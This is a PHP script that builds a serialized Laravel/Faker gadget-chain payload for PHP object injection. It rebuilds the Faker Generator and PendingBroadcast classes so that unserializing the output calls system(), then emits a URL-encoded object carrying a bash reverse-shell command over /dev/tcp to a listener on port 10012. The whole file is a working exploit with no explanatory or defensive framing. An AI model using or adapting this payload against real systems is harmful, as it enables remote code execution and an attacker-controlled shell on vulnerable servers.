<?php

namespace Faker{
    class Generator
    {
        protected $formatters = array();
        public function __construct($formatters)
        {
            $this->formatters = $formatters;
        }
    }
}

namespace Illuminate\Broadcasting{
    class PendingBroadcast{
        protected $events;
        protected $event;

        public function __construct($events, $event)
        {
            $this->events = $events;
            $this->event = $event;
        }
    }
}

namespace{
    $b = new Faker\Generator(array('dispatch'=>'system'));
    $a = new Illuminate\Broadcasting\PendingBroadcast($b, "bash -c 'bash -i >& /dev/tcp/127.0.0.1/10012 0>&1'");
    echo urlencode(serialize($a));
}